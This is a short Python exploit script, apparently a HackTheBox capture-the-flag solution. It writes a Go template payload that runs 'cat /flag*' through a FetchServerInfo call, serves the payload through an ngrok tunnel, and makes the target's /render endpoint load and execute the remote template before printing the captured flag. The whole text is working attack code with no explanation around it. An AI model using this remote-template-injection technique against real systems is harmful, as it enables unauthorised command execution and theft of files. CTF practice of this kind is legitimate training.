import os
import sys
import re
import requests
from pyngrok import ngrok

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <target_host>")
    sys.exit(1)

target = sys.argv[1]

os.makedirs("ngrok_payload", exist_ok=True)
with open("ngrok_payload/index.tpl", "w") as tpl:
    tpl.write('<html><body><pre>{{ .FetchServerInfo "cat /flag*" }}</pre></body></html>')

os.chdir("ngrok_payload")
os.system("python3 -m http.server 8000 &")
os.chdir("..")

tunnel = ngrok.connect(8000, bind_tls=True)
public_url = tunnel.public_url.rstrip("/")

payload = f"http://{target}/render?use_remote=true&page={public_url}/index.tpl"
res = requests.get(payload)

m = re.search(r"HTB\{.*?\}", res.text)
if m:
    print(m.group(0))
